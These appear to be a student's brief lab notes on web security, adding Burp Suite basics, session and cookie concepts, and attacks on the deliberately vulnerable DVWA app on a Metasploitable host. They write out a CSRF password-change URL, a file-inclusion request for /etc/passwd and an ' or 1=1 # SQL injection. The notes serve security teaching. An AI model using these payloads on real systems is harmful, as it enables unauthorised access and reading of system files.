@@ -1,0 +1,35 @@
+Agenda
+1. Burfsuite
+Request and response
+2. Web vulnerabilities in metasploitable 
+web application
+
+Session/Cookie
+Web application
+Login - >session-Sessionid
+browser
+http protocol - stateless
+local storage
+session
+cookie
+JWT - Json Web Token
+
+Metasploitable
+ip address
+10.151.5.23
+
+http://10.151.5.23/
+http://10.151.5.23/dvwa/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change#
+
+http://10.151.5.23/dvwa/vulnerabilities/fi/?page=page1.php
+http://10.151.5.23/dvwa/vulnerabilities/fi/?page=page2.php
+http://10.151.5.23/dvwa/vulnerabilities/fi/?page=page3.php
+
+http://10.151.5.23/dvwa/vulnerabilities/fi/?page=/etc/passwd
+
+sql injection
+"select * from user where id = 1"
+
+' or 1=1 #
+
+'select * from user where id = ' or 1=1
